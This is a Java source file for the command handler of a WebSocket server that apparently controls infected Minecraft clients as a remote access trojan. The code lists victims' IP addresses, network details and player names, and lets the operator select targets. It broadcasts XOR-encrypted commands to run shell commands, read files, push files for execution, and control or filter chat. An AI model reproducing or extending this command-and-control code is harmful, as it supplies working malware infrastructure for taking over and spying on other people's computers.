package me.soda.server.handlers;

import com.google.gson.JsonObject;
import me.soda.server.Server;
import org.java_websocket.WebSocket;

import java.io.File;
import java.io.FileInputStream;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;

public class CommandHandler {
    private static List<WebSocket> connCollection;
    private static boolean all = true;

    private void tryBroadcast(String message, Server server) {
        byte[] encrypted = Server.xor.encrypt(message);
        if (all)
            server.broadcast(encrypted);
        else
            server.broadcast(encrypted, connCollection);
    }

    @SuppressWarnings("resource")
    public boolean handle(String in, Server server) {
        boolean stop = false;
        String[] msgArr = in.split(" ");
        if (msgArr.length > 0) {
            try {
                switch (msgArr[0]) {
                    case "stop" -> {
                        server.stop();
                        stop = true;
                    }
                    case "conn" -> {
                        if (msgArr.length == 1) {
                            Server.log("----CONNECTIONS----");
                            server.getConnections().forEach(conn -> {
                                int index = conn.<Integer>getAttachment();
                                JsonObject jsonObject = Server.clientMap.get(conn);
                                Server.log(String.format("IP: %s, ID: %s, Player:%s",
                                        jsonObject.getAsJsonObject("ip").get("ip").getAsString(),
                                        index, jsonObject.get("playerName").getAsString()));
                            });
                        } else if (msgArr.length == 3) {
                            switch (msgArr[1]) {
                                case "net" -> server.getConnections().stream().filter(conn ->
                                                conn.<Integer>getAttachment() == Integer.parseInt(msgArr[2]))
                                        .forEach(conn -> Server.log(String.format("ID: %s, Network info: %s ", msgArr[2],
                                                Server.clientMap.get(conn).getAsJsonObject("ip").toString()
                                        )));
                                case "player" -> server.getConnections().stream().filter(conn ->
                                                conn.<Integer>getAttachment() == Integer.parseInt(msgArr[2]))
                                        .forEach(conn -> Server.log(String.format("ID: %s, Player info: %s ", msgArr[2],
                                                Server.clientMap.get(conn).toString()
                                        )));
                                case "sel" -> {
                                    connCollection = new ArrayList<>();
                                    if (msgArr[2].equals("all")) {
                                        all = true;
                                        Server.log("Selected all clients!");
                                        break;
                                    }
                                    server.getConnections().stream().filter(conn ->
                                                    conn.<Integer>getAttachment() == Integer.parseInt(msgArr[2]))
                                            .forEach(conn -> connCollection.add(conn));
                                    Server.log("Selected client!");
                                }
                                case "disconnect" -> {
                                    server.getConnections().stream().filter(conn ->
                                                    conn.<Integer>getAttachment() == Integer.parseInt(msgArr[2]))
                                            .forEach(conn -> conn.send("kill"));
                                    Server.log("Client " + msgArr[2] + " disconnected");
                                }
                                default -> {
                                }
                            }
                        }
                    }
                    case "chat", "chat_control", "chat_filter", "shell", "read" -> {
                        if (msgArr.length < 2) break;
                        String[] strArr = new String[msgArr.length - 1];
                        System.arraycopy(msgArr, 1, strArr, 0, strArr.length);
                        tryBroadcast(msgArr[0] + " " + Base64.getEncoder().encodeToString(
                                String.join(" ", strArr).getBytes(StandardCharsets.UTF_8)), server);
                    }
                    case "execute" -> {
                        if (msgArr.length < 2) break;
                        String[] strArr2 = new String[msgArr.length - 1];
                        System.arraycopy(msgArr, 1, strArr2, 0, strArr2.length);
                        File file = new File(String.join(" ", strArr2));
                        FileInputStream is = new FileInputStream(file);
                        tryBroadcast(msgArr[0] + " " + Base64.getEncoder().encodeToString(is.readAllBytes()), server);
                    }
                    default -> tryBroadcast(in, server);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return stop;
    }
}
